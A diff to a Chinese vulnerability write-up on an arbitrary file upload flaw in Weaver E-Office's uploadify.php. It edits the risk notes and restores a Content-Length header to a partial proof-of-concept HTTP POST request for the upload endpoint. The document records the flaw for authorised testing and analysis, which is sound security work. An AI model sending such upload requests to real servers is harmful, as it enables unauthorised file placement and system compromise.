@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -114,6 +114,7 @@ POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
 Connection: close
+Content-Length: 259
 Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
 Accept-Encoding: gzip
 
@@ -126,7 +127,7 @@ Content-Type: image/jpeg
 --e64bdf16c554bbc109cecef6451c26a4--
 ```
 
-> 请求长度说明：原资料 Content-Length 为 259；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 259；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 ![image-20230828150715083](./.resource/泛微OA-E-Office-uploadify-任意文件上传漏洞/media/image-20230828150715083.png)
 
